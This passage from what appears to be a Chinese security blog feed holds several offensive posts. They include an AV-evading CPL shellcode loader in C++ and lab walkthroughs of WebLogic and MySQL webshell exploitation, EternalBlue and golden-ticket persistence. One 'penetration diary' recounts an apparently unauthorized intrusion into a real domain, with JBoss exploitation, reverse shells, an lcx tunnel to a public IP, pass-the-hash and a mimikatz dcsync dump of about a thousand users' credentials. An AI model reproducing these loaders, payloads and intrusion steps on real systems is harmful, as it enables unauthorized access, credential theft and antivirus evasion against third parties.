class="hljs-built_in">lstrlenA</span>(path)));<br></code></pre></td></tr></table></figure><p>不一定将cpl文件放到c盘更目录,可以自定义路径<br>执行后<br><img src="/img/cpl/12.png"><br>然后这里在开启control.exe时,test.cpl文件也会被打开。<br><img src="/img/cpl/13.png"></p><p>如果目标主机有杀软,可以通过该方法白加黑绕过,但是msf的cpl文件特征非常明显,静态太概率都会被杀掉。<br><img src="/img/cpl/14.png"><br>除了加壳之外,寄希望于自己实现加载shellcode,方便做混淆。</p><h3 id="使用shellcode自己做一个cpl文件"><a href="#使用shellcode自己做一个cpl文件" class="headerlink" title="使用shellcode自己做一个cpl文件"></a>使用shellcode自己做一个cpl文件</h3><p>直接上代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;pch.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;windows.h&quot;</span></span><br><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> __declspec(dllexport) <span class="hljs-function">VOID <span class="hljs-title">CPlApplet</span><span class="hljs-params">(HWND hwndCPl, UINT msg, LPARAM lParam1, LPARAM lParam2)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">MessageBoxA</span>(<span class="hljs-number">0</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;test&quot;</span>, MB_OK);<br>    <span class="hljs-comment">/* length: 835 bytes */</span><br>    <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span> buf[] = <span class="hljs-string">&quot;shellcode&quot;</span>;<br>    LPVOID Memory = <span class="hljs-built_in">VirtualAlloc</span>(<span class="hljs-literal">NULL</span>, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    <span class="hljs-built_in">memcpy</span>(Memory, buf, <span class="hljs-built_in"><span class="hljs-keyword">sizeof</span></span>(buf));<br>    ((<span class="hljs-built_in"><span class="hljs-keyword">void</span></span>(*)())Memory)();<br>&#125;<br><span class="hljs-function">BOOL APIENTRY <span class="hljs-title">DllMain</span><span class="hljs-params">( HMODULE hModule,</span></span><br><span class="hljs-params"><span class="hljs-function">                       DWORD  ul_reason_for_call,</span></span><br><span class="hljs-params"><span class="hljs-function">                       LPVOID lpReserved</span></span><br><span class="hljs-params"><span class="hljs-function">                     )</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in"><span class="hljs-keyword">switch</span></span> (ul_reason_for_call)<br>    &#123;<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_ATTACH:<br>    <span class="hljs-keyword">case</span> DLL_THREAD_DETACH:<br>    <span class="hljs-keyword">case</span> DLL_PROCESS_DETACH:<br>        <span class="hljs-keyword">break</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>这是最最最最基础的loader<br>先打开<code>control.exe</code>看看效果<br><img src="/img/cpl/15.png"></p><p>看看查杀率</p><p><img src="/img/cpl/16.png"><br>这里上传的文本,shellcode没有做任何的处理,查杀率已经算比较低的,如果混淆一下,很轻松的就可以静态过杀软,再用白加黑,是不是想想就很轻松呢。</p><p>经过一系列处理后,找杀毒能力还比较强的360试一下<br><img src="/img/cpl/17.png"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html">https://wooyun.js.org/drops/CPL%E6%96%87%E4%BB%B6%E5%88%A9%E7%94%A8%E4%BB%8B%E7%BB%8D.html</a></p><p><a href="https://attack.mitre.org/techniques/T1218/002/">https://attack.mitre.org/techniques/T1218/002/</a></p><p><a href="https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules">https://docs.microsoft.com/zh-cn/windows/security/threat-protection/windows-defender-application-control/applocker/working-with-applocker-rules</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透日记一(下)</title>
    <link href="/2021/07/26/br_domain2/"/>
    <url>/2021/07/26/br_domain2/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>上次说到,探测到内网三台主机有ms17010的漏洞,准备深挖一波。</p><h2 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h2><p>cs上还是不太好打,派生个会话给msf。我的vps是windows server的,一开始下了个windows版的msf在vps上,但是添加路由的时候一直说我参数不对,就不知道咋回事。</p><p><img src="/img/br_domain2/1.png"><br>还是算了,就搞个代理到本机用虚拟机kali吧。我用的是frp,vps当server,虚拟机当client</p><p>vps配置<code>frps.ini</code><br>配一个端口<br><img src="/img/br_domain2/2.png"></p><p>kali配置<code>frpc.ini</code><br><img src="/img/br_domain2/3.png"></p><p>然后vps上命令行启动frps.exe<br><code>frps.exe -c frps.ini</code></p><p><img src="/img/br_domain2/4.png"></p><p>kali执行<br><code>frpc.exe -c frpc.ini</code></p><p><img src="/img/br_domain2/5.png"><br>这样就可以愉快的派生会话了,但是这里最后打的时候三台主机没一台能打下来。首先三台主机都没有开启管道,只能用eterblue模块,最后也没成功,这个域系统安全性还是比较高的。</p><h2 id="pth"><a href="#pth" class="headerlink" title="pth"></a>pth</h2><p>没办法,系统漏洞一台拿不了,但是通过端口扫描发现大量主机开启445端口,于是还是先pass the hash</p><p>批量撞一波<br><img src="/img/br_domain2/7.png"></p><p><img src="/img/br_domain2/8.png"></p><p>断断续续拿下不少主机<br><img src="/img/br_domain2/6.png"></p><p>这时就一台一台的信息收集</p><h2 id="rdp劫持会话"><a href="#rdp劫持会话" class="headerlink" title="rdp劫持会话"></a>rdp劫持会话</h2><p>在27这台主机上发现,有两个会话,上面是我们已知账号和明文密码的普通域内账户,而下面这个用户经过比对,为域中域管用户。<br><img src="/img/br_domain2/9.png"></p><p>由于我们自身权限也高,这里就想rdp上去劫持该会话(当时打的时候比较激动,没注意看这个会话是失效的,这里还是记录一下)<br>看眼时间,应该在休息呢<br><img src="/img/br_domain2/14.png"></p><p>lcx设置代理<br>目标机器上<br><code>shell C:\Windows\system32\lcx.exe -slave 公网ip 7212 127.0.0.1 3389</code><br>vps上<br><code>lcx -listen 7212 5555</code></p><p><img src="/img/br_domain2/10.png"></p><p><img src="/img/br_domain2/11.png"></p><p><img src="/img/br_domain2/12.png"></p><p>在cs上执行<code>shell tscon 2</code><br>他说没有权限。<br><img src="/img/br_domain2/13.png"></p><p>在目标机器执行的时候提示错误的密码,猜想大概是会话断联的原因。如果STATE是active应该是没问题的。</p><h2 id="拿下DC"><a href="#拿下DC" class="headerlink" title="拿下DC"></a>拿下DC</h2><p>将所有拿下的主机的hash全部dump出来,整合后发现有Administrator的账户hash,且是域中账户,而在域中Administrator是作为域管账户的。<br>445端口开启<br><img src="/img/br_domain2/15.png"></p><p>尝试pth<br><img src="/img/br_domain2/16.png"></p><p><img src="/img/br_domain2/17.png"><br>失败了,如果不能pth这个hash将索然无味,又不能拿到明文<br>这里搞了很久,然后又回去信息收集。<br>搞来搞去搞了很久,还是那么7、8台主机,最后也是没办法,由于抓到了很多密码,把所有Administrator用户的hash全部pass了一遍,终于拿下了域控</p><p><img src="/img/br_domain2/18.png"></p><p>导出ntds,抓下密码,这里使用mimikatz<br><code>lsadump::dcsync /domain:xxx /all /csv command</code></p><p><img src="/img/br_domain2/19.png"></p><p><img src="/img/br_domain2/20.png"></p><p>将近一千个用户,RDP他们好像随时都是连着的。</p><p><img src="/img/br_domain2/21.png"></p><p>想3389上去看一下,找一个没有连接的用户</p><p><img src="/img/br_domain2/22.png"></p><p>找到该用户的hash拿去解密</p><p><img src="/img/br_domain2/23.png"></p><p>成功连接</p><p><img src="/img/br_domain2/24.png"></p><p>收工,准备吃晚饭了</p><h2 id="ENDING…"><a href="#ENDING…" class="headerlink" title="ENDING…"></a>ENDING…</h2>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>渗透日记一(上)</title>
    <link href="/2021/07/23/br_domain1/"/>
    <url>/2021/07/23/br_domain1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>由于最近学习内网,打了一些靶场,觉得还是挺枯燥的,就想找一个真实的环境练练手,在hxd的指引下,找了个站去练练手。</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>上来就是一个jboss界面</p><p><img src="/img/br_domain/1.png"></p><p>随手一点,<code>JMX Console</code>竟然可以直接进。<br><img src="/img/br_domain/2.png"></p><p>这里最经典的玩法就是war包的远程部署</p><p>找到<code>jboss.deployment</code><br><img src="/img/br_domain/3.png"></p><p>进入后找到<code>void addURL()</code></p><p><img src="/img/br_domain/4.png"><br>这里网上有很多文章写这个玩法,这里就不复现了。</p><p>而前辈们早已写出了集成化工具,放到脚本工具上跑一下看看</p><p><img src="/img/br_domain/5.png"></p><p>脚本显示有两个漏洞,其中一个就是<code>JMX Console</code>,直接让脚本跑一下试试。</p><p>直接反弹了一个shell<br><img src="/img/br_domain/6.png"></p><p>由于这个shell比较脆弱,这里大致查查进程(无AV),看看管理员登录时间和网卡信息等等。</p><p><img src="/img/br_domain/7.png"></p><p><img src="/img/br_domain/10.png"></p><p><img src="/img/br_domain/8.png"></p><p><img src="/img/br_domain/9.png"></p><p>可以看到是有域的</p><p><img src="/img/br_domain/11.png"></p><p>大致了解了情况后就想直接走后渗透,ping下度娘看下机器出不出网。</p><p><img src="/img/br_domain/12.png"><br>是出网的,由于是国外的机器ping就比较高,由于无杀软,所以准备直接powershell上线</p><p><img src="/img/br_domain/13.png"><br>因为后来发现域很大,派生了一个会话来操作。</p><h2 id="后渗透"><a href="#后渗透" class="headerlink" title="后渗透"></a>后渗透</h2><h3 id="本机信息收集"><a href="#本机信息收集" class="headerlink" title="本机信息收集"></a>本机信息收集</h3><p>权限很高,上来先把hash抓到,心安一点。</p><p><img src="/img/br_domain/14.png"></p><p><img src="/img/br_domain/15.png"></p><p>一开始没注意仔细看,这里已经发现当前主机所在的域名</p><p><img src="/img/br_domain/16.png"></p><p>由于是在域中,通过dns大致定位域控ip<br><img src="/img/br_domain/17.png"></p><p>不急着打域控,先做一波信息收集</p><h3 id="域内信息收集"><a href="#域内信息收集" class="headerlink" title="域内信息收集"></a>域内信息收集</h3><p>查询域数量<br><img src="/img/br_domain/18.png"></p><p>查询域内计算机列表<br><img src="/img/br_domain/20.png"></p><p>查询域管账户<code>net group &quot;domain admins&quot; /domain </code><br><img src="/img/br_domain/19.png"></p><p>查询域控账户<code>shell net group &quot;domain controllers&quot; /domain</code><br><img src="/img/br_domain/21.png"></p><p>这里04和53的后缀和刚刚DNS的后缀是一样的,确认域控机器和账户</p><p>查询域内用户<code>shell net user /domain</code></p><p><img src="/img/br_domain/22.png"></p><p>这一个域大概是三四百个用户账号,还是比较大的</p><p>查询域所用主机名<code>shell net group &quot;domain computers&quot; /domain</code></p><p><img src="/img/br_domain/23.png"><br>主机也有一百多台</p><p><code>shell net accounts /domain</code>查看域账户属性,没有要求强制更改密码</p><p><img src="/img/br_domain/24.png"></p><p><code>shell nltest /domain_trusts</code>域信任信息</p><p><img src="/img/br_domain/25.png"></p><p><code>shell net group /domain</code>查看域中组信息<br><img src="/img/br_domain/30.png"></p><p><code>net use</code>查看是否有ipc连接,<code>net share</code>查看共享<br><img src="/img/br_domain/26.png"></p><p>但是这里<code>net session</code>有几台,这是其他主机连接本机的ipc连接<br><img src="/img/br_domain/31.png"></p><h3 id="spn扫描"><a href="#spn扫描" class="headerlink" title="spn扫描"></a>spn扫描</h3><p>机器在域内了,spn是不得不看一下的,比起端口扫描更精确,也更加隐蔽,这是由于SPN扫描通过域控制器的LDAP进行服务查询,而这正是Kerberos票据行为的一部分。<br>windows自带了一款工具:setspn<br><code>shell setspn -T xxxx -Q */*</code></p><p>这里就可以看到28机器有MSSQL服务,开启1433端口<br><img src="/img/br_domain/27.png"></p><p>这里服务确实有点太多了,为了方便就将结果输出到文本<br><img src="/img/br_domain/28.png"></p><p>将主机名列出<br><code>grep &quot;CN=&quot; spn.txt | awk -F &quot;,&quot; &#123;&#39;print $1&#39;&#125; | awk -F &quot;=&quot; &#123;&#39;print $2&#39;&#125; &gt; host.txt</code><br><img src="/img/br_domain/29.png"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>上来先试试pth域控,无果,又尝试扫描MS17010,也没有洞,只能去先横向其他的主机。通过上面net session,发现一个与当前主机用户名相同的账户名称,尝试psexec传递hash<br>拿下该主机</p><p><img src="/img/br_domain/33.png"></p><p>这个session有一个作用就是盗取令牌,创建更高权限账户的进程,比如域管的cmd这种,但是这里我对比了net session的用户名和域管用户的用户名,发现没有一个是相同的,这个方法也就不去尝试了。</p><p>批量扫一波MS17010,这个域的防御性比较高,只有零星几台有漏洞。</p><p><img src="/img/br_domain/34.png"></p><p><img src="/img/br_domain/35.png"></p><p><img src="/img/br_domain/36.png"></p><p>并且同网段没有,只有0,2,3段各一台,这里就像先把他们都先拿下,看OS版本应该是没问题的,准备派生会话给msf去打。但天色一晚,歇息了,歇息了。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>域渗透之黄金票据权限维持</title>
    <link href="/2021/07/21/hongri2/"/>
    <url>/2021/07/21/hongri2/</url>
    
    <content type="html"><![CDATA[<h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h3><p>DC：</p><ul><li>IP：10.10.10.10</li><li>OS：Windows 2012</li></ul><p>WEB：</p><ul><li>IP1：10.10.10.80</li><li>IP2：192.168.111.80</li><li>OS：Windows 2008</li><li>网站搭建:Weblogic 10.3.6 MSSQL 2008</li></ul><p>PC：</p><ul><li>IP1：10.10.10.201</li><li>IP2：192.168.111.201</li><li>OS：Windows 7</li></ul><p>攻击机：</p><ul><li>IP：192.168.111.129</li><li>OS：Windows 10</li><li>IP：192.168.111.128</li><li>OS：Kali</li></ul><p>内网网段：10.10.10.0/24<br>DMZ网段：192.168.111.0/24</p><p>进入<code>C:\Oracle\Middleware\user_projects\domains\base_domain\bin</code>目录下管理员身份开启startWeblogic批处理程序<br><img src="/img/hongri2/2.png"></p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><p>使用nmap扫描端口<br><img src="/img/hongri2/3.png"></p><p>有445 SMB,3389 RDP登端口开启<br>1433端口和7001端口分别是是MSSQL和Weblogic服务<br><img src="/img/hongri2/4.png"></p><p>访问端口看看<br><img src="/img/hongri2/5.png"><br>这里有个报错,我们先不管,由于是WebLogic,默认目录<code>http://xxxxxx:7001/console</code>下为后台管理页面登录<br><img src="/img/hongri2/6.png"></p><p>尝试弱密码后无果,使用工具尝试WebLogic漏反序列化漏洞,即CVE-2019-2725<br><img src="/img/hongri2/7.png"></p><p>命令也能成功执行<br><img src="/img/hongri2/8.png"></p><p>这里就想上传一个稳定的webshell,用其他更强大的webshell工具去连<br><img src="/img/hongri2/9.png"></p><p>于是就想传一个webshell,用其他webshell工具去连<br>上传冰蝎jsp马到目录<code>C:\Oracle\Middleware\wlserver_10.3\server\lib\consoleapp\webapp\framework\skins\wlsconsole\images\shell.jsp</code><br><img src="/img/hongri2/10.png"></p><p>连接成功<br><img src="/img/hongri2/11.png"></p><p>这里已经发现是一张双网卡主机,有可能10段通向内网<br><img src="/img/hongri2/12.png"></p><p>无ipc连接,net view命令无法使用<br><img src="/img/hongri2/13.png"></p><p>并已知是域内主机<br><img src="/img/hongri2/14.png"></p><p>查看进程无杀软,也无浏览器等信息(无法抓取浏览器密码),并且net命令返回ERROR 5 这是没有权限,于是准备反弹shell到后渗透神器cs,进行提权等操作</p><p><img src="/img/hongri2/15.png"></p><p><img src="/img/hongri2/16.png"></p><h2 id="后渗透-内网漫游"><a href="#后渗透-内网漫游" class="headerlink" title="后渗透(内网漫游)"></a>后渗透(内网漫游)</h2><h3 id="提权及信息获取"><a href="#提权及信息获取" class="headerlink" title="提权及信息获取"></a>提权及信息获取</h3><p>直接powershell上线<br><img src="/img/hongri2/17.png"></p><p>甜土豆进行提权<br><img src="/img/hongri2/18.png"></p><p>通过<code>nslookup</code>查询dns记录,这里查到一个<code>10.10.10.10</code>的ip,在域内,这个ip很有可能就是域控<br><img src="/img/hongri2/19.png"></p><p>又通过<code>net time</code>查到主域名称<br><img src="/img/hongri2/20.png"></p><p>抓取本机密码<br><img src="/img/hongri2/21.png"><br>可以看到其中有mssql明文密码和Administrator明文密码</p><p>准备3389连接,不过无论是<code>Administrator</code>还是<code>de1ay</code>都无法登录,准备添加一个账户,但添加后说没有权限,应该是普通用户组没有权限<br><img src="/img/hongri2/24.png"></p><p>使用命令添加到管理员组,连接成功<br><img src="/img/hongri2/25.png"></p><h3 id="横向移动"><a href="#横向移动" class="headerlink" title="横向移动"></a>横向移动</h3><p>扫描下同网段其他主机<br><img src="/img/hongri2/21.png"></p><p>扫描<code>192.168.111.0/24</code>以及他们的端口,发现一台名为<code>PC</code>主机,并且3389开启<br><img src="/img/hongri2/22.png"></p><p>再扫描10段<br><img src="/img/hongri2/23.png"><br>发现一台名为DC主机,看着名字就知道是域控,加上刚刚探测dns和主域名称,并且他的ip是<code>10.10.10.10</code>,基本可以判断这台就是域控</p><h3 id="psexec"><a href="#psexec" class="headerlink" title="psexec"></a>psexec</h3><p>那么在域控明确的情况下优先处理<code>DC</code>,首先想到的就是pth,因为域内很多密码都是批量设置的,这必须要试一下<br>使用当前抓取的Administrator账户和密码来传递</p><p><img src="/img/hongri2/26.png"><br>这里应该是成功了,但是迟迟未上线</p><p><img src="/img/hongri2/27.png"><br>太概率是由于对方不出网,无法形成反向shell,不出网的话一般就用smb处理,翻回刚刚的扫描记录,对方445端口是开启的,可以使用smb拿不出网主机<br><img src="/img/hongri2/28.png"></p><p>新增一个SMB beacon<br><img src="/img/hongri2/29.png"></p><p>再次使用psexec pass the hash<br><img src="/img/hongri2/30.png"></p><p>成功拿下DC<br><img src="/img/hongri2/31.png"></p><h3 id="MS17010"><a href="#MS17010" class="headerlink" title="MS17010"></a>MS17010</h3><p>那么这里换一种思路,如果pth失败了,怎么办,那就要使用已知漏洞,比如MS7010<br>这里使用Ladon对10段扫描漏洞,发现DC是有漏洞的<br><img src="/img/hongri2/46.png"><br>在cs上不方便操作,派生会话给msf<br>首先在msf上执行如下操作</p><ul><li>use exploit/multi/handler</li><li>set payload windows/meterpreter/reverse_http（跟cs上选用的payload一样）</li><li>set lhost 本机ip</li><li>set lport 接受的端口</li><li>exploit 执行</li></ul><p><img src="/img/hongri2/47.png"><br>回到cs上创建一个foreign监听的listeners<br><img src="/img/hongri2/48.png"></p><p>创建后右键WEB选择增加会话<br><img src="/img/hongri2/49.png"></p><p>选择msf的payload<br><img src="/img/hongri2/50.png"></p><p>msf等待shel反弹即可<br><img src="/img/hongri2/51.png"></p><p>由于目标不出网,需要先添加路由</p><ul><li>run get_local_subnets</li><li>run autoroute -s 10.10.10.0/24</li><li>run autoroute -p</li></ul><p><img src="/img/hongri2/52.png"></p><p>一开始使用<code>windows/smb/ms17_010_eternalblue</code>这个模块<br><img src="/img/hongri2/53.png"></p><p>已经攻击成功了但是没有session返回,去看了一眼,好家伙,直接蓝屏<br><img src="/img/hongri2/54.png"><br>所以这个模块一定要慎用。索性换个模块<br>成功拿下<br><img src="/img/hongri2/55.png"></p><h3 id="抓取DC密码"><a href="#抓取DC密码" class="headerlink" title="抓取DC密码"></a>抓取DC密码</h3><p>hashdump<br><img src="/img/hongri2/32.png"><br>有了域内<code>KRBTGT</code>账户的hash就可以伪造黄金票据</p><p>logonpasswords<br><img src="/img/hongri2/33.png"></p><p>查询域管账户<br><img src="/img/hongri2/34.png"><br>DC就算是拿下了</p><p>用相同的方式拿下PC<br><img src="/img/hongri2/35.png"><br>PC是出网的可以直接用http beacon</p><p><img src="/img/hongri2/36.png"></p><h3 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h3><p>做权限维持方式很多,粘滞键、启动项、影子用户等等。这次是拿到域控,这种情况下,黄金票据是一个很好的维权手段<br>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p><p>黄金票据的条件要求：</p><ol><li>域名称</li><li>域的SID值</li><li>域的KRBTGT账户NTLM密码哈希</li><li>伪造用户名</li></ol><p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p><p>这里我们已经拿到了<code>KRBTGT</code>账户的hash值<br><img src="/img/hongri2/37.png"></p><p>并且也拿到了域的SID值,去掉最后的-1001<br><img src="/img/hongri2/38.png"><br>就可以伪造一张黄金票据</p><p>选择最边缘的web<br><img src="/img/hongri2/39.png"></p><p>伪造黄金票据成功<br><img src="/img/hongri2/40.png"></p><p>这里为了测试用了PC,一开始是无法访问域控目录的<br><img src="/img/hongri2/41.png"></p><p>生成黄金票据后<br><img src="/img/hongri2/42.png"></p><p>即使域控这台主机权限掉了,我们也能使用其他边缘主机用这个黄金票据模拟获得最高权限,而且由于跳过AS验证,无需担心域管密码被修改<br><img src="/img/hongri2/43.png"></p><p>添加域管账户<br><img src="/img/hongri2/44.png"><br>在域控上查看域管账户,添加成功<br><img src="/img/hongri2/45.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>内网靶场实战一</title>
    <link href="/2021/07/11/hongri1/"/>
    <url>/2021/07/11/hongri1/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本来不想写这些的,但是最近项目写起来确实稍有些枯燥,又不敢拿真实环境去打,奈何两个月过后要去比赛,所以这段时间会加强web打点和内网这块,这些方面我是小白,欢迎斧正。</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>靶场地址:<a href="http://vulnstack.qiyuanxuetang.net/vuln/detail/2/">http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</a></p><p><img src="/img/hongri1/1.png"><br>网卡配置:</p><p><img src="/img/hongri1/2.png"></p><p>网络拓扑图:<br>kali和web服务器模拟外网环境,并且web服务器有双网卡,一张通向内网<br><img src="/img/hongri1/3.png"></p><p>win7作为与外界相连的web服务器</p><h2 id="web打点"><a href="#web打点" class="headerlink" title="web打点"></a>web打点</h2><h3 id="方式一"><a href="#方式一" class="headerlink" title="方式一"></a>方式一</h3><p>直接访问目标<br><img src="/img/hongri1/4.png"></p><p>试试弱密码root root,连接成功<br><img src="/img/hongri1/5.png"></p><p>再回来探测下端口信息</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">namp</span> -sV <span class="hljs-number">192.168.235.129</span><br></code></pre></td></tr></table></figure><p><img src="/img/hongri1/6.png"></p><p>可以看到只有3306 mysql和80端口开放<br>再扫下目录<br>可以看到phpmyadmin和一个rar包,应该是源码泄露<br><img src="/img/hongri1/7.png"></p><p>phpmyadmin还是弱密码root root<br><img src="/img/hongri1/8.png"></p><p>压缩包解压后是yxcms<br><img src="/img/hongri1/9.png"></p><p>在网上搜锁该cms的漏洞,发现后台<br><img src="/img/hongri1/10.png"></p><p>还是弱口令 admin 123456登录后台<br>后台有个位置任意文件写入<br><img src="/img/hongri1/11.png"></p><p>但是没看到路径,尝试bp报错找到路径<br><img src="/img/hongri1/12.png"></p><p>访问测试一下,后来发现跟改的url有关,成功访问<br><img src="/img/hongri1/13.png"></p><p>这样一个shell就拿到了<br><img src="/img/hongri1/14.png"></p><h3 id="方式二"><a href="#方式二" class="headerlink" title="方式二"></a>方式二</h3><p>回到刚刚phpmyadmin界面<br>利用全局变量general_log去getshell</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams">SHOW <span class="hljs-keyword">VARIABLES</span> LIKE <span class="hljs-comment">&#x27;%general%&#x27;</span><br></code></pre></td></tr></table></figure><p><img src="/img/hongri1/15.png"><br>看到是off,是关闭的,于是尝试更改</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log</span>=on<br></code></pre></td></tr></table></figure><p>再次查询就已经开启<br><img src="/img/hongri1/16.png"><br>再把网站日志文件名和后缀名改一下</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;C:/phpstudy/www/yxcms/log.php&#x27;</span><br></code></pre></td></tr></table></figure><p>使用<code>SELECT &quot;&lt;?php eval($_POST[&#39;cmd&#39;]);?&gt;&quot;</code>写入shell<br><img src="/img/hongri1/17.png"><br>连接成功<br><img src="/img/hongri1/18.png"></p><h2 id="内网漫游"><a href="#内网漫游" class="headerlink" title="内网漫游"></a>内网漫游</h2><p>因为平时cs用的比较多,所以这次就用msf试试<br>发现双网卡<br><img src="/img/hongri1/19.png"><br><code>192.168.26.0/24</code>通向内网<br>net view无回显,tasklist发现无杀软<br><img src="/img/hongri1/20.png"></p><p>权限还可以,3389未开放<br><img src="/img/hongri1/21.png"><br>因为权限够,也不需要提权了,直接修改注册表</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server <span class="hljs-regexp">/v fDenyTSConnections /</span>t REG_DWORD <span class="hljs-regexp">/d 00000000 /</span>f<br></code></pre></td></tr></table></figure><p>再次查看发现已经开启<br><img src="/img/hongri1/22.png"></p><h3 id="反弹shell到msf"><a href="#反弹shell到msf" class="headerlink" title="反弹shell到msf"></a>反弹shell到msf</h3><p>生成一个powershell的马<br><img src="/img/hongri1/23.png"><br>监听<br><img src="/img/hongri1/24.png"><br>但是执行好像没成功,msf也没收到会话<br><img src="/img/hongri1/25.png"><br>应该是禁用了执行powershell,懒得改了,算了换个exe吧<br><img src="/img/hongri1/26.png"><br>上传执行后成功反弹shell<br><img src="/img/hongri1/27.png"><br>添加路由<br><img src="/img/hongri1/28.png"><br>探测内网存活主机,发现两台<br><img src="/img/hongri1/29.png"><br>直接扫一波永恒之蓝<br><img src="/img/hongri1/30.png"><br>发现129这台为2008且有永恒之蓝<br>使用command模块打一波,命令执行成功<br><img src="/img/hongri1/31.png"><br>想要反弹shell却失败了<br><img src="/img/hongri1/32.png"><br>复制个shell给cs,没上线,很无语<br><img src="/img/hongri1/33.png"><br>还是直接上吧,舒服多了<br><img src="/img/hongri1/34.png"><br>抓一波密码<br><img src="/img/hongri1/35.png"><br>抓到明文,这里其实就可以3389连上去看看<br><img src="/img/hongri1/36.png"><br>不过还是先扫,探测一下存活主机<br><img src="/img/hongri1/37.png"><br>这里第一时间是想横向一波,psexec,但是执行后服务已经建立,但是无shell反弹,突然想起这是台不出网主机,选择smb beacon即可<br><img src="/img/hongri1/38.png"></p><p><img src="/img/hongri1/39.png"></p><p>03拿下<br><img src="/img/hongri1/40.png"></p><p>同样的方法拿下域控2008<br><img src="/img/hongri1/41.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>滕蛇</title>
    <link href="/2021/07/03/TengSnake/"/>
    <url>/2021/07/03/TengSnake/</url>
    
    <content type="html"><![CDATA[<p>前几天师傅叫我写个连webshell的工具,本来觉得对我来说是个挑战,但后来细想这是有必要的,陆陆续续写了一些小的东工具西,也要带着一个大项目走。<br>将继续采用c++,MFC编写。</p><h2 id="滕蛇"><a href="#滕蛇" class="headerlink" title="滕蛇"></a>滕蛇</h2><p>这是我为它取得名字,”滕蛇”为上古十大神兽之一,希望它愈加强大的愿景。本文写在这里,纪念滕蛇的出生。</p><p><img src="/img/TengSnake/1.png"></p><p><img src="/img/TengSnake/2.jpg"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>shellcode加载Tips之回调函数</title>
    <link href="/2021/06/27/CallBackByPass/"/>
    <url>/2021/06/27/CallBackByPass/</url>
    
